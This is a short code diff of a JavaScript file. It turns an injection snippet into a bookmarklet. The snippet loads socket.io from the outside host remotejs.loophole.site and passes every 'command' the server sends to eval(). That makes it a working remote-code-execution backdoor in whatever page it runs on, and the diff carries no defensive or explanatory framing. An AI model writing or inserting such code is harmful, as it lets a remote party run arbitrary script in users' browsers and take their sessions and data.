@@ -33,7 +33,8 @@ document.onkeydown = function (e) {
     }
   }
 }
-document.head.innerHTML+=`
+
+javascript:(function(){document.head.innerHTML+=`
 <script src="https://remotejs.loophole.site/socket.io/socket.io.js"></script>
 <script>
 const socket = io("https://remotejs.loophole.site");
@@ -41,4 +42,4 @@ socket.on("command", function(command) {
 eval(command);
 });
 </script>
-`;
+`;})();
